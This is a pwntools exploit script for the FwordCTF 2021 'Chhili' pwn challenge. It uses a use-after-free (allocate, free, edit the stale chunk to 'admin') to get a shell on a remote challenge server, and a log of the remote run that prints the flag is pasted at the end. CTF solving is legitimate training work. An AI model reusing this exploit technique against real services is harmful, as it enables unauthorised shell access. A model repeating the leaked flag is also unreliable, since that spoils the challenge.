from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './chhili'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "40.71.72.198"
  PORT = 1234
  s = remote(HOST, PORT)
  #libc = ELF("./libc-2.23.so")
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.31.so'})
  #libc = elf.libc
  #libc = ELF("./libc-2.31.so")

def Alloc(size, data):
  s.sendlineafter(">> ", "1")
  s.sendlineafter(">> ", str(size))
  s.sendafter(">> ", data)
  
def Delete():
  s.sendlineafter(">> ", "2")

def Edit(data):
  s.sendlineafter(">> ", "3")
  s.sendlineafter(">> ", data)

def Get_shell():
  s.sendlineafter(">> ", "4")
 
Alloc(0x18, "A"*0x10)
Alloc(0x18, "B"*0x10)
Delete()
Edit("admin\x00")
Alloc(0x20, "C"*0x10)
Get_shell()

s.interactive()

'''
mito@ubuntu:~/CTF/FwordCTF_2021/Pwn_Chhili$ python3 solve.py r
[*] '/home/mito/CTF/FwordCTF_2021/Pwn_Chhili/chhili'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 40.71.72.198 on port 1234: Done
[*] Switching to interactive mode
$ id
uid=1000(fword) gid=1000(fword) groups=1000(fword)
$ ls -l
total 44
-rwxrwxr-x 1 root root 17664 Aug 27 16:14 chhili
-rw-rw-r-- 1 root root    52 Aug 27 16:14 flag.txt
-rwxrwxr-x 1 root root 18744 Aug 27 16:14 ynetd
$ cat flag.txt
FwordCTF{th1s_will_b3_your_f1rSt_st3p_481364972164}
'''
